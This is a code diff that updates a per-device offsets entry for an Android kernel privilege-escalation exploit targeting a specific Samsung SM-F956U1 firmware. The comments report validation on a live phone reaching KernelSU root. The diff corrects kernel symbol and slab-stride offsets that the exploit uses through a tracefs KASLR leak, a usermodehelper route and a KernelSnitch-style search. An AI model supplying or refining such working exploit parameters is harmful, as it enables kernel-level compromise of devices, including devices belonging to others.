@@ -1,10 +1,10 @@
-/* Image-derived candidate for Samsung SM-F956U1 / F956U1UES4DZG3.
+/* Validated target for Samsung SM-F956U1 / F956U1UES4DZG3.
  *
- * Extracted from the exact AP boot.img and xbl_config.elf on 2026-09-22
- * with tools/extract_target.py and LLVM 22.1.8.  The connected phone reports
- * the matching uname release and tracefs event metadata; the debug payload
- * path has not been run.  Keep tracefs_leak enabled so a future run aborts if
- * the leak metadata does not match instead of guessing a KASLR slide.
+ * Extracted from the exact AP boot.img and xbl_config.elf on 2026-09-22 with
+ * tools/extract_target.py and LLVM 22.1.8, then validated on the live device on
+ * 2026-09-23: the app-driven run reaches KernelSU root without rebooting the
+ * phone.  Keep tracefs_leak enabled so a future run aborts if the leak metadata
+ * does not match instead of guessing a KASLR slide.
  */
 
 OFFSETS_ENTRY(
@@ -19,9 +19,12 @@ OFFSETS_ENTRY(
     .umh_root = 1,
     .sync_route = 1,
     .off_call_usermodehelper_exec_work = 0x000d39cc,
-    .off_system_unbound_wq = 0x0023ae60,
+    /* kallsyms: system_unbound_wq = 0xffffffc00a23ae60. */
+    .off_system_unbound_wq = 0x0223ae60,
     .kimage_text_base = 0xffffffc008000000,
-    .mm_struct_sz = 0x3c0,
+    /* BTF sizeof(mm_struct)=0x3c0; SLUB rounds this cache to a 0x400
+     * object stride.  KernelSnitch must search the allocation stride. */
+    .mm_struct_sz = 0x400,
     .page_slab_cache = 0x18,
     .kernel_phys_load = 0xa8000000,
     .pselect_waiter_shift = 1,
@@ -45,7 +48,9 @@ OFFSETS_ENTRY(
     .off_kmalloc_caches = 0x0176c6f8,
     .off_anon_pipe_buf_ops = 0x01219d90,
     .off_slide_nfulnl_logger = 0x02242a20,
-    .off_slide_boot_id = 0x026046e8,
+    /* random_table + 0x108 points at the boot-id data slot; the sysctl
+     * table's data pointer is the separate 0x026046e8 symbol. */
+    .off_slide_boot_id = 0x023762f0,
     .off_slide_sysctl_bootid = 0x026046e8,
     .off_configfs_read_iter = 0x004712a4,
     .off_configfs_bin_write_iter = 0x004717d4,
